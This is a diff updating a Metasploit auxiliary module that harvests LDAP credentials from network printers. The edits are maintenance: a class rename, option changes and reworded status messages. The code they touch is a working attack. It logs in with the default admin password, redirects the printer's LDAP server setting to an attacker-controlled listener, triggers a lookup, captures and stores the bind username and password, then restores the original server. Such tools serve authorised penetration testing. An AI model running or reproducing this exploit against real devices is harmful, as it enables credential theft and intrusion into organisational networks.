@@ -1,12 +1,11 @@
-#
-# This module requires Metasploit: http://metasploit.com/download
+##
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'rex/proto/http'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
@@ -22,26 +21,26 @@ class Metasploit3 < Msf::Auxiliary
           'Deral "Percentx" Heiland',
           'Pete "Bokojan" Arzamendi'
         ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => false }
     ))
 
     register_options(
       [
-        OptBool.new('SSL', [true, 'Negotiate SSL for outgoing connections', false]),
         OptString.new('PASSWORD', [true, 'Password to access administrative interface. Defaults to 1111', '1111']),
         OptPort.new('RPORT', [true, 'The target port on the remote printer. Defaults to 80', 80]),
         OptInt.new('TIMEOUT', [true, 'Timeout for printer connection probe.', 20]),
         OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination.', 20]),
         OptString.new('NewLDAPServer', [true, 'The IP address of the LDAP server you want the printer to connect back to.'])
-      ], self.class)
+      ])
   end
 
   def run
-    print_status("#{peer} - Attempting to extract LDAP username and password...")
+    print_status("Attempting to extract LDAP username and password...")
 
     @auth_cookie = default_page
     if @auth_cookie.blank?
-      print_status("#{peer} - Unable to get authentication cookie from #{rhost}")
+      print_status("Unable to get authentication cookie from #{rhost}")
       return
     end
 
@@ -56,10 +55,10 @@ class Metasploit3 < Msf::Auxiliary
 
     start_listener
     unless @data
-      print_error("#{peer} - Failed to start listiner or the printer did not send us the creds. :(")
+      print_error("Failed to start listiner or the printer did not send us the creds. :(")
       status = restore_ldap_server
       unless status
-        print_error("#{peer} - Failed to restore old LDAP server. Please manually restore")
+        print_error("Failed to restore old LDAP server. Please manually restore")
       end
       return
     end
@@ -71,13 +70,13 @@ class Metasploit3 < Msf::Auxiliary
     ldap_creds = "#{ldap_binary_creds[0]}:#{ldap_binary_creds[1]}"
 
     # Woot we got creds so lets save them.#
-    print_good("#{peer} - The following creds were capured: #{ldap_creds}")
+    print_good("The following creds were capured: #{ldap_creds}")
     loot_name     = 'ldap.cp.creds'
     loot_type     = 'text/plain'
     loot_filename = 'ldap-creds.text'
     loot_desc     = 'LDAP Pass-back Harvester'
     p = store_loot(loot_name, loot_type, datastore['RHOST'], @data, loot_filename, loot_desc)
-    print_status("#{peer} - Credentials saved in: #{p}")
+    print_good("Credentials saved in: #{p}")
 
     register_creds('ldap', rhost, @ldap_port, ldap_binary_creds[0], ldap_binary_creds[1])
   end
@@ -87,7 +86,7 @@ class Metasploit3 < Msf::Auxiliary
     method = 'GET'
     res = make_request(page, method, '')
     if res.blank? || res.code != 200
-      print_error("#{peer} - Failed to connect to #{rhost}. Please check the printers IP address.")
+      print_error("Failed to connect to #{rhost}. Please check the printers IP address.")
       return ''
     end
     res.get_cookies
@@ -109,7 +108,7 @@ class Metasploit3 < Msf::Auxiliary
 
     res = make_request(login_page, method, login_post_data)
     if res.blank? || res.code != 200
-      print_error("#{peer} - Failed to login. Please check the password for the Administrator account")
+      print_error("Failed to login. Please check the password for the Administrator account")
       return nil
     end
     res.code
@@ -126,9 +125,9 @@ class Metasploit3 < Msf::Auxiliary
     ldap_port_number = ldap_port_settings.scan(/valPrt_1\[2\] = (\d+)/).flatten
     @ldap_server = "#{ldap_server_ip[0]}.#{ldap_server_ip[1]}.#{ldap_server_ip[2]}.#{ldap_server_ip[3]}"
     @ldap_port = ldap_port_number[0]
-    print_status("#{peer} - LDAP server: #{@ldap_server}")
+    print_status("LDAP server: #{@ldap_server}")
     unless res.code == 200 || res.blank?
-      print_error("#{peer} - Failed to get LDAP data.")
+      print_error("Failed to get LDAP data.")
       return nil
     end
     res.code
@@ -149,10 +148,10 @@ class Metasploit3 < Msf::Auxiliary
     ldap_update_post *= '&'
     method = 'POST'
 
-    print_status("#{peer} - Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}")
+    print_status("Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}")
     res = make_request(ldap_update_page, method, ldap_update_post)
     if res.blank? || res.code != 200
-      print_error("#{peer} - Failed to update LDAP server. Please check the host: #{rhost}")
+      print_error("Failed to update LDAP server. Please check the host: #{rhost}")
       return nil
     end
     res.code
@@ -184,7 +183,7 @@ class Metasploit3 < Msf::Auxiliary
     ldap_trigger_post *= '&'
     method = 'POST'
 
-    print_status("#{peer} - Triggering LDAP reqeust")
+    print_status("Triggering LDAP reqeust")
     res = make_request(ldap_trigger_page, method, ldap_trigger_post)
     res.code
   end
@@ -243,10 +242,10 @@ class Metasploit3 < Msf::Auxiliary
     ldap_restore_post *= '&'
     method = 'POST'
 
-    print_status("#{peer} - Restoring LDAP server: #{@ldap_server}")
+    print_status("Restoring LDAP server: #{@ldap_server}")
     res = make_request(ldap_restore_page, method, ldap_restore_post)
     if res.blank? || res.code != 200
-      print_error("#{peer} - Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
+      print_error("Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
       return nil
     end
     res.code
@@ -265,7 +264,7 @@ class Metasploit3 < Msf::Auxiliary
       }, datastore['TIMEOUT'].to_i)
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      print_error("#{peer} - Connection failed.")
+      print_error("Connection failed")
     end
 
     res
